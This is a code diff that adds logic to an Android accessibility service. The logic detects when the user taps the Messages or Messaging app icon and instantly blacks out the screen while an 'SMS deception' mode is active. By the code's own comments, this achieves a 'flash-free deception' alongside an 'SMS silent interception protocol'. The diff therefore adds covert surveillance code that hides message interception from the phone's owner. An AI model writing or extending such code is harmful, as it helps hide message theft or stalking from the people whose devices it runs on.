@@ -499,6 +499,24 @@ class MyAccessibilityService : AccessibilityService() {
         
         val pkgName = event.packageName?.toString() ?: return
 
+        // --- PRE-EMPTIVE LAUNCHER CLICK INTERCEPTION ---
+        // Intercepts the touch event on the Home Screen / Launcher BEFORE the window actually shifts,
+        // blacking out the screen instantly during the transition to guarantee a 100% flash-free deception.
+        if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
+            val text = event.text.joinToString(" ")
+            val desc = event.contentDescription?.toString() ?: ""
+            val isMessagesClick = text.contains("Messages", ignoreCase = true) || 
+                                  desc.contains("Messages", ignoreCase = true) ||
+                                  text.contains("Messaging", ignoreCase = true) ||
+                                  desc.contains("Messaging", ignoreCase = true)
+            
+            val smsDeceptionActive = getSharedPreferences("app_config", Context.MODE_PRIVATE).getBoolean("sms_deception_active", false)
+            if (isMessagesClick && smsDeceptionActive && !isSafeZoneActive(this)) {
+                DebugLogger.log("SMS_INTERCEPT", "Pre-emptive launcher click detected. Blacking out screen.")
+                DimmerManager.applyDim(this, 0, "AUTO")
+            }
+        }
+
         // --- SMS SILENT INTERCEPTION PROTOCOL ---
         val smsDeceptionActive = getSharedPreferences("app_config", Context.MODE_PRIVATE).getBoolean("sms_deception_active", false)
         if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
